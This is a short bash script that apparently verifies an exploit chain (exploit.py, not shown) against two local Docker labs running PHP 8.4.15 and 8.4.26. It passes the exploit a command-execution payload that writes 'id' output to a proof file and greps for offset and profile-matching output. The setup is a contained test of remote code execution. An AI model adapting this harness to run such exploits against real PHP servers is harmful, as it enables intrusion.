#!/usr/bin/env bash
# End-to-end verification: run the chain against both labs with no
# --offsets-env, so the profile lookup alone has to pick the right build.
#
#   ./verify_profiles.sh
#
# Expects both containers up:
#   ./lab_php_versi8415.sh up     # :8088
#   ./lab_php_versi8426.sh up     # :8089
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(dirname "$HERE")"
OUT="$ROOT/out"
cd "$ROOT" || exit 1

mkdir -p "$OUT"

run_one() {
  local port="$1" label="$2" tag="$3"
  echo "=============================================="
  echo "  $label  (127.0.0.1:$port)  - no --offsets-env"
  echo "=============================================="
  rm -f "$OUT/RESULT" "$OUT/RESULT.proof"
  docker exec "php${tag}-lab" sh -c 'rm -f /out/RESULT /out/RESULT.proof' 2>/dev/null

  timeout 900 python3 exploit.py -t "http://127.0.0.1:$port/index.php" \
    --out-dir "$OUT" \
    --cmd 'id>/out/RESULT;touch /out/RESULT.proof' 2>&1 \
    | grep -E 'matched profile|offsets:|libphp=|decoded=|chain completed|all attempts|zif='

  echo
  if [ -s "$OUT/RESULT" ]; then
    echo "  PROOF: $(cat "$OUT/RESULT")"
  else
    echo "  NO PROOF"
  fi
  echo
}

run_one 8088 "PHP 8.4.15" 8415
run_one 8089 "PHP 8.4.26" 8426
